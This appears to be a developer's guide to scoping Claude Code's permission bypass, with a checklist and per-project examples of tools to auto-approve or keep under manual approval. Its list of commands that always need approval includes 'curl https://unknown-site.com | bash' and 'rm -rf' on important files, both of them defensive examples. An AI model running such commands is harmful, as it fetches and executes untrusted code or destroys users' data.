# Strategy for Bypassing Permissions with Claude Code

## Overview

Bypass permissions trades approval prompts for autonomous execution. The goal is to reduce friction without removing oversight. Use selectively and scoped, not blanket.

---

## ✅ Safe to Bypass (Low Risk)

Enable bypass for operations that are:
- **Routine and predictable** in your known codebases
- **Read-only** or sandbox-safe
- **Confined to your project folder** (write access already restricted)

### Safe Tools to Bypass:
- `npm` — test, install, build commands
- `git` — add, commit, push, status, diff
- `pytest` / `xcodebuild` — test runners
- **Read operations** on your own code
- **File editing** within your project scope

### Example Configuration:
```
Bypass enabled for:
✅ npm (test, install, build)
✅ git (commit, push, status)
✅ File reads
✅ Test runners (pytest, xcodebuild)
```

---

## ❌ Keep Manual Approval (High Risk)

**Never bypass for:**
- **Network operations** — curl, wget, API calls to unknown services
- **System commands** — chmod, rm, rm -rf, sudo, package managers (apt, brew, pkg)
- **Untrusted sources** — code from unknown repos, scripts from the web
- **Bash commands with pipes** — especially piping to `bash` or `sh`
- **Critical file operations** — modifications to .env, credentials, config files

### Example: Always Require Approval
```
❌ curl https://unknown-site.com | bash
❌ rm -rf /path/to/important/files
❌ npm install from untrusted registry
❌ Any bash command you haven't explicitly reviewed
```

---

## 🎯 Recommended Implementation Strategy

### Phase 1: Start Restrictive
- Keep everything on **manual approval** for your first session
- Observe which operations repeat and feel safe
- Don't enable anything yet — just observe patterns

### Phase 2: Enable Selectively
After 1-2 sessions, enable bypass only for:
- Tools you use every session (npm, git)
- Operations you've reviewed and trust
- Commands specific to your project type (xcodebuild for iOS, pytest for Python, etc.)

### Phase 3: Use Per-Codebase Settings
- Different projects = different risk profiles
- Dwellable (iOS/Swift): xcodebuild, git, file reads ✅
- Unknown open-source: everything manual ❌
- Your own backend: npm, git, tests ✅

### Phase 4: Periodic Audits
- Run `/permissions` regularly to review what you've approved
- Disable bypass for any tool you haven't used in a session
- Re-enable as needed

### Phase 5: Disable for Risky Work
- Exploring unknown codebases → disable bypass
- Working with external APIs → disable bypass
- Integrating third-party code → disable bypass
- Back to safe, known work → re-enable as appropriate

---

## Core Principle

**Bypass permissions = reduced friction, not removed safety.**

Even with bypass enabled:
- Sandboxing still protects your filesystem
- Write access still restricted to your project
- Prompt injection detection still active
- Command blocklist still enforced
- Your responsibility to review code before approval doesn't change

---

## Security Checklist

Before enabling bypass for any tool:
- [ ] Have you used this tool multiple times in this project?
- [ ] Do you understand what it does?
- [ ] Is it reading/writing only to your project folder?
- [ ] Are you NOT calling external services?
- [ ] Would you feel comfortable if it ran without asking?

If all ✅, safe to bypass. If any ❌, keep manual approval.

---

## Examples by Project Type

### iOS Development (Dwellable)
```
Bypass: xcodebuild, git, npm (for scripts)
Manual: curl, network requests, system commands
```

### Web Backend
```
Bypass: npm test, npm build, git, node, pytest
Manual: Database operations, API calls to external services
```

### Data Science
```
Bypass: jupyter, pytest, git, pip (from trusted sources)
Manual: curl/wget, any external data fetches, system installs
```

---

## When to Disable Bypass

- Exploring unfamiliar code
- Working with code from untrusted sources
- Making changes to sensitive configuration
- Testing scripts or commands you haven't written
- Integrating third-party libraries

**Rule:** When in doubt, require manual approval. Friction is a feature when safety is the priority.

---

## Reporting Suspicious Activity

If Claude Code suggests something that feels wrong:
- Don't approve it
- Run `/feedback` to report
- Let Anthropic know what seemed off
- Disable bypass if you're concerned

---

**Last Updated:** April 28, 2026
